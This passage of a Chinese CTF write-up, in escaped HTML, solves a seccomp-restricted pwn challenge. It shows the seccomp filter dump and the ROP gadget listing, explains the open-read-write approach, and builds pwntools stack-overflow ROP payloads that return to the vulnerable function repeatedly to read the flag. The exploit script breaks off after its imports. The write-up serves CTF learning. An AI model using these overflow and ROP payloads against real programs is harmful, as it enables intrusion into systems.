[rbp-4h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fd = sys_open(&lt;span class=&#34;string&#34;&gt;&amp;quot;./gifts.txt&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt;(s, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( read(fd, s, &lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;uLL) &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;read error&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _exit(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; write(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, s, &lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;检查安全措施&#34;&gt;&lt;a href=&#34;#检查安全措施&#34; class=&#34;headerlink&#34; title=&#34;检查安全措施&#34;&gt;&lt;/a&gt;检查安全措施&lt;/h2&gt;&lt;p&gt;​		install_seccomp、&lt;/p&gt;
&lt;p&gt;​		看到这个函数就知道有seccomp保护措施,限制了一些系统调用的使用,于是使用工具进行检查,&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM&lt;span class=&#34;number&#34;&gt;-24&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-10&lt;/span&gt;-ubuntu:/tmp&lt;span class=&#34;meta&#34;&gt;# seccomp-tools dump ./rop&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; line  CODE  JT   JF      K&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;=================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0000&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000004&lt;/span&gt;  A = arch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0001&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x0c&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xc000003e&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A != ARCH_X86_64) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0014&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0002&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;  A = sys_number&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0003&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x35&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x0a&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x40000000&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A &amp;gt;= &lt;span class=&#34;number&#34;&gt;0x40000000&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0014&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0004&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x08&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000002&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == open) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0013&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0005&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x07&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000101&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == openat) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0013&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0006&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x06&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x000001b5&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == &lt;span class=&#34;number&#34;&gt;0x1b5&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0013&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0007&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x05&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == read) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0013&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0008&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x04&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000001&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == write) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0013&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0009&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x03&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000003&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == close) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0013&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0010&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x02&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x0000003c&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0013&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0011&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x01&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x000000e7&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == exit_group) &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0013&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0012&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x06&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00050005&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ERRNO(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0013&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x06&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x7fff0000&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ALLOW&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0014&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x06&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; KILL&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		能够看到只允许用open read write这几个,一般来说pwn题是要拿到权限的,但是根本目的是拿到flag,所以即便拿不到shell,也可以利用这几个函数调用来读取和打印flag&lt;/p&gt;
&lt;h1 id=&#34;解题步骤&#34;&gt;&lt;a href=&#34;#解题步骤&#34; class=&#34;headerlink&#34; title=&#34;解题步骤&#34;&gt;&lt;/a&gt;解题步骤&lt;/h1&gt;&lt;h2 id=&#34;寻找gadget&#34;&gt;&lt;a href=&#34;#寻找gadget&#34; class=&#34;headerlink&#34; title=&#34;寻找gadget&#34;&gt;&lt;/a&gt;寻找gadget&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM&lt;span class=&#34;number&#34;&gt;-24&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-10&lt;/span&gt;-ubuntu:/tmp# ROPgadget --binary rop  --only &lt;span class=&#34;string&#34;&gt;&amp;#x27;pop|ret&amp;#x27;&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Gadgets information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;============================================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x00000000004014fc&lt;/span&gt; : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x00000000004014fe&lt;/span&gt; : pop r13 ; pop r14 ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x0000000000401500&lt;/span&gt; : pop r14 ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x0000000000401502&lt;/span&gt; : pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x00000000004014fb&lt;/span&gt; : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x00000000004014ff&lt;/span&gt; : pop rbp ; pop r14 ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x000000000040121d&lt;/span&gt; : pop rbp ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x0000000000401503&lt;/span&gt; : pop rdi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x0000000000401501&lt;/span&gt; : pop rsi ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x00000000004014fd&lt;/span&gt; : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x000000000040101a&lt;/span&gt; : ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x0000000000401297&lt;/span&gt; : ret &lt;span class=&#34;number&#34;&gt;0x2be&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Unique gadgets found: &lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		根据调用约定,rdi rsi rdx是函数的前三个参数,但是没有找到pop rdx的gadget. ret2csu方法里是可以间接修改rdx的,&lt;font color=&#34;red&#34;&gt;不过事实上,这道题不需要管第三个参数,具体原因还未知.&lt;/font&gt;&lt;/p&gt;
&lt;h2 id=&#34;布局函数&#34;&gt;&lt;a href=&#34;#布局函数&#34; class=&#34;headerlink&#34; title=&#34;布局函数&#34;&gt;&lt;/a&gt;布局函数&lt;/h2&gt;&lt;p&gt;​		这里有一个很重要的问题,就是二进制文件中不存在flag这四个字符,因为后面读取flag,需要用到这个字符串,所以需要先获取这四个字符. 获取之后利用传统的orw来进行打开,读取和写出flag.&lt;/p&gt;
&lt;p&gt;open(’文件名‘,0,0)  &lt;/p&gt;
&lt;p&gt;read(文件描述符,‘文件名’,读取大小)   read比较特殊, 第一个文件描述符 0标准输入(从用户输入获取值) 1 标准输出,2标准错误 345..就是文件描述符了,当第一个参数是0的时候,第二个参数就不是文件名了,而是要写入的内存地址&lt;/p&gt;
&lt;p&gt;write(1，‘文件名’，写大小)&lt;/p&gt;
&lt;p&gt;​		所以分了四个步骤,如下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;read(0,写入的内存地址,0x30)	&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;open(‘flag’,0,0)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;read(3,‘flag’,0x30) 从打开的文件中读取&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;write(1,‘flag’,0x30) 标准输出&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;编写payload&#34;&gt;&lt;a href=&#34;#编写payload&#34; class=&#34;headerlink&#34; title=&#34;编写payload&#34;&gt;&lt;/a&gt;编写payload&lt;/h2&gt;&lt;p&gt;​		256溢出+8字节rbp,然后就是返回地址了,构造rop链,下面四行分别对应着上面的四步&lt;/p&gt;
&lt;p&gt;​		poprsi的话,没有单独的 ,只有 0x0000000000401501 : pop rsi ; pop r15 ; ret, 所以在它后面再加一个垃圾数据.上面说过,没有pop rdx,所以我们只需要控制前两个参数即可&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;264&lt;/span&gt; + p64(poprdi) + p64(&lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;) + p64(poprsi)+ p64(bssaddr) +p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+ p64(readaddr) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload += p64(poprdi) +  p64(bssaddr) + p64(poprsi) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(openaddr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload += p64(poprdi) + p64(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;) + p64(poprsi) + p64(bssaddr) +p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+ p64(readaddr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload += p64(poprdi) + p64(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) + p64(poprsi) + p64(bssaddr) +p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) +p64(writeaddr)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		但是这里还有问题,就是payload的长度太长,溢出只有0x150 - 256 - 8  &amp;#x3D;72字节,是不够用的,所以这里需要再进行调整,有两个办法,一个是可以多次溢出,四步可以分四步来进行,每完成一步,再跳回到vul函数开头,重新溢出执行下一步,第二个办法是进行栈迁移,把栈移到更大的空间去&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;264&lt;/span&gt; + p64(poprdi) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(poprsi)+ p64(bssaddr) +p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+ p64(readaddr)+p64(vuladdr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;264&lt;/span&gt;+p64(poprdi) +  p64(bssaddr) + p64(poprsi) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(openaddr)+p64(vuladdr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload2 = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;264&lt;/span&gt;+p64(poprdi) + p64(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;) + p64(poprsi) + p64(bssaddr) +p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+ p64(readaddr)+p64(vuladdr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload3 = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;264&lt;/span&gt;+p64(poprdi) + p64(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) + p64(poprsi) + p64(bssaddr) +p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) +p64(writeaddr)+p64(vuladdr)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		分四次发送即可,每次在最后跳回vul函数开头&lt;/p&gt;
&lt;h2 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h2&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; time&lt;/span&gt;&lt;br&gt;&lt;span 